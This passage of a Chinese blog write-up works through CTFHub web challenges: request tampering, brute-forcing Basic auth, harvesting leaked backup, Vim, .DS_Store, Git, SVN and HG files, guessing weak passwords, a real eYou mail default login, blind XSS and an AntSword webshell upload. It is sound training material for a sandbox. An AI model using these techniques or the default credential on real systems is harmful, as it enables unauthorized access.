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" alt></p><p>题目页面要求是以 <strong>CTFHUB</strong>方式访问页面，在burpsuite里把<strong>GET</strong>方式换成<strong>CTFHUB</strong>即可得FLAG。</p><h3 id="302跳转">302跳转</h3><p>打开页面提示没有FLAG：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121162437419.png" alt></p><p>点击下面的超链接后用burpsuite开启截断，发现FLAG：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121162302042.png" alt></p><h3 id="Cookie">Cookie</h3><p>打开网页得到提示，应该是改cookie为admin来获取FLAG:</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121162713385.png" alt></p><p>burpsuite开启截断发现admin参数，值改成1即可得到FLAG。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121162748829.png" alt></p><h3 id="基础认证">基础认证</h3><p><strong>先补充一下基本知识：</strong></p><p>桌面应用程序也通过HTTP协议跟Web服务器交互， 桌面应用程序一般不会使用cookie, 而是把 &quot;用户名+冒号+密码&quot;用BASE64算法加密后的字符串放在http request 中的header Authorization中发送给服务端， 这种方式叫HTTP基本认证(Basic Authentication)。</p><p><strong>HTTP基本认证的过程</strong></p><p>第一步: 客户端发送http request 给服务器，</p><p>第二步: 因为request中没有包含Authorization header, 服务器会返回一个401 Unauthozied给客户端，并且在Response的 header “WWW-Authenticate” 中添加信息。</p><p>第三步：客户端把用户名和密码用BASE64加密后，放在Authorization header中发送给服务器， 认证成功。</p><p>第四步：服务器将Authorization header中的用户名密码取出，进行验证， 如果验证通过，将根据请求，发送资源给客户端</p><p><strong>回到题目：</strong></p><p>有一个基础认证页面，点进去会要求输入用户名和密码：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121162917224.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121162923230.png" alt></p><p>无论如何先抓下包看看：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121162958073.png" alt></p><p>发现在AUTH一栏有一段base64编码，应该是我输入的用户名和密码。放行后看看返回的数据包，显示认证错误，不过在Www-Auth一栏发现提示信息：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121163154080.png" alt></p><p>直接把得到AUTH值与发送的AUTH值进行比较，base64编码后发送发现不行，应该是思路错了。</p><p>看了基础知识之后才明白提示信息是在说用户名是对的，需要爆破密码。</p><p>使用burpsuite的intruder模块，对“admin：”前半段信息进行base64加密，之后在爆破选项里选择密码并进行后半段的base64加密：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121163637933.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121163628512.png" alt></p><p>从结果筛选出200响应：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121163703554.png" alt></p><h3 id="响应包源代码">响应包源代码</h3><p>故名思议，打开题目按F12就能找到FLAG了：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121164511152.png" alt></p><h2 id="信息泄漏">信息泄漏</h2><h3 id="目录遍历">目录遍历</h3><p>打开题目之后出现页面，发现是递归的目录：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121165715898.png" alt></p><p>总共没多少个文件，不用上工具就能找到FLAG:</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121165911526.png" alt></p><h3 id="PHPINFO">PHPINFO</h3><p>直接全文搜索FLAG，没什么好说的：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121170015736.png" alt></p><h3 id="备份文件下载">备份文件下载</h3><h4 id="网站源码">网站源码</h4><p>提示给的很明白了：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121170149540.png" alt></p><p>无非就是这几种名称和后缀的排列组合，直接上intruder的<strong>cluster bomb</strong>，设置如下：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121170739020.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121170745672.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121170752183.png" alt></p><p>攻击筛选200响应，下载压缩包得到源码文件，发现并没有FLAG：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121171021930.png" alt="image-20210121171021930"></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121171528343.png" alt></p><p>因为是源码，所以FLAG肯定部署在服务器上了，直接把文件地址复制到题目地址后面拿到FLAG：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121171623098.png" alt></p><h4 id="bak文件">bak文件</h4><p>根据上一题，我以为只是把后缀名加个bak就完事儿了，然后没爆破出来。</p><p>仔细一想如果这么简单的话跟上一题合并出不就好了么……</p><p>然后根据提示，在php后加了bak的后缀名得到FLAG:</p><p><strong><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121172105513.png" alt></strong></p><h4 id="Vim缓存">Vim缓存</h4><p><strong>知识补充：</strong></p><p>当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。</p><p>需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的。</p><p>意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。</p><p>例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。</p><p><strong>回到题目</strong>，一开始输入的时候我只是在后面加后缀名，一直报404找不到文件。找了下资料才发现缓存文件是隐藏文件，前面应该加个点（.index.php.bak）。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121172801489.png" alt></p><p>notepad++打开获取FLAG:</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121172945203.png" alt></p><h4 id="DS-Store">.DS_Store</h4><p><strong>知识补充：</strong></p><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p><strong>回到题目</strong>，下载这个文件之后用notepad++打开发现是乱码，应该是二进制文件，之后用winhex打开得到FLAG地址：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121173715902.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121173817372.png" alt></p><h3 id="Git泄漏">Git泄漏</h3><h4 id="Log">Log</h4><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><p><strong>回到题目</strong>，不多说，githack一把梭：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121175230935.png" alt></p><p>把泄漏的git仓库直接下载下来了，之后<code>git clone</code>查看变动信息：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121175335564.png" alt></p><p>找到最新提交的<strong>commit</strong>，然后用<code>git diff cbf0ed6041b8276d9985372a0ab213cec6cf43f1 </code>查看变动，得到FLAG：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121175541950.png" alt></p><h4 id="Stash">Stash</h4><p>**知识补充，**常用git stash命令：</p><p>（1）<strong>git stash</strong> save “save message” : 执行存储时，添加备注，方便查找，只有git stash 也要可以的，但查找时不方便识别。</p><p>（2）<strong>git stash list</strong> ：查看stash了哪些存储</p><p>（3）<strong>git stash show</strong> ：显示做了哪些改动，默认show第一个存储,如果要显示其他存贮，后面加stash@{$num}，比如第二个 git stash show stash@{1}</p><p>（4）<strong>git stash show -p</strong> : 显示第一个存储的改动，如果想显示其他存存储，命令：git stash show stash@{$num} -p ，比如第二个：git stash show stash@{1} -p</p><p>（5）<strong>git stash apply</strong> :应用某个存储,但不会把存储从存储列表中删除，默认使用第一个存储,即stash@{0}，如果要使用其他个，git stash apply stash@{$num} ， 比如第二个：git stash apply stash@{1}</p><p>（6）<strong>git stash pop</strong> ：命令恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@{0}，如果要应用并删除其他stash，命令：git stash pop stash@{$num} ，比如应用并删除第二个：git stash pop stash@{1}</p><p>（7）<strong>git stash drop</strong> stash@{<span class="katex-error" title="ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;}&#039; at position 4: num}̲ ：丢弃stash@{">num} ：丢弃stash@{</span>num}存储，从列表中删除这个存储</p><p>（8）<strong>git stash clear</strong> ：删除所有缓存的stash</p><p><strong>回到题目</strong>，依然先githack一把梭，把仓库下载下来，之后<code>git stash pop</code>把缓存读取出来：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121183243527.png" alt></p><h4 id="Index">Index</h4><p>同上，把源码下载下来即可看到FLAG文件：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121183735762.png" alt></p><h3 id="SVN泄漏">SVN泄漏</h3><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p><p>这次换svnexploit一把梭：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121184440271.png" alt></p><p>发现了FLAG文件，直接去服务器和本地找发现找不到。</p><p>之后在网上搜了搜，在Linux虚拟机里换了<strong>dvcs-ripper</strong>，也没有找到其他人writeup写的FLAG文件。</p><p>又回头看看命令行发现了报错：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121194051031.png" alt></p><p>查看资料是缺少<strong>perl模块</strong>（参考：<a href="https://blog.csdn.net/weixin_45485719/article/details/104958542%EF%BC%89%EF%BC%8C%E4%BA%8E%E6%98%AF%E5%AE%89%E8%A3%85%E5%90%8E%E5%86%8D%E5%8E%BB%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E7%BB%88%E4%BA%8E%E5%BE%97%E5%88%B0FLAG%EF%BC%9A">https://blog.csdn.net/weixin_45485719/article/details/104958542），于是安装后再去执行脚本终于得到FLAG：</a></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210121194320588.png" alt></p><h4 id="HG泄漏">HG泄漏</h4><p>不懂什么叫HG，搜索了一下，好像是和Git差不多的分布式版本管理系统。</p><p>依然是使用<strong>dvcs-ripper</strong>工具：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210122121822559.png" alt></p><p>不知道跟上一个程序是不是存在问题，暂且看下目录：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210122121900485.png" alt></p><p>没发现有FLAG文件一类的，先把每个文件看下，发现了文件地址，之后把文件名拼接到服务器上，获取FLAG：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210122122100470.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210122122106770.png" alt></p><h2 id="密码口令">密码口令</h2><h3 id="弱口令">弱口令</h3><p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p><p>打开题目页面，随便输入账号和密码提示用户名和密码有一个是错误的，所以需要同时猜解用户名和密码。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210122122421084.png" alt></p><p>直接上<strong>Cluster bomb</strong>，分别在用户名和密码处打标记，然后分配字典：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210122123554906.png" alt></p><p>刚开始跑字典没跑出来，换了个字典跑出来，由此可见有个好字典是多么重要……突然想到之前几次比赛CTF-WEB涉及到字典的题没跑出来，我还以为是自己思路不对，现在觉得应该是字典不对……</p><h3 id="默认密码">默认密码</h3><p>打开题一看是这个：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210122124156543.png" alt></p><p>直接搜素<strong>eYou email默认密码</strong>，查到一个**账户是eyougw，密码是admin@(eyou)**的默认账号。登上去拿FLAG。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210122124238042.png" alt></p><h2 id="XSS">XSS</h2><h3 id="反射型">反射型</h3><p>打开网页，会有两个输入框，第一个输入payload即可在下方名称处触发弹窗，第二个无反应，查了查别人的writeup才知道需要xss盲打。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126094623387.png" alt></p><p>通过第一个触发xss的链接，也就是<a href="http://challenge-cdbd51b1ae2c4a42.sandbox.ctfhub.com:10080/?name=%EF%BC%8C%E4%B9%8B%E5%90%8E%E5%8A%A0%E4%B8%8Axss%E5%B9%B3%E5%8F%B0%E7%9A%84payload%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E9%93%BE%E6%8E%A5%E6%8F%90%E4%BA%A4%EF%BC%8C%E4%B9%8B%E5%90%8E%E5%B0%B1%E8%83%BD%E5%9C%A8%E5%B9%B3%E5%8F%B0%E6%94%B6%E5%88%B0FLAG%E4%BA%86%EF%BC%9A">http://challenge-cdbd51b1ae2c4a42.sandbox.ctfhub.com:10080/?name=，之后加上xss平台的payload构造一个新的链接提交，之后就能在平台收到FLAG了：</a></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126094958979.png" alt></p><h2 id="文件上传">文件上传</h2><h3 id="无验证">无验证</h3><p>没什么好说的，上传蚁剑shell连接就完事了：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126100613209.png" alt></p><p><img 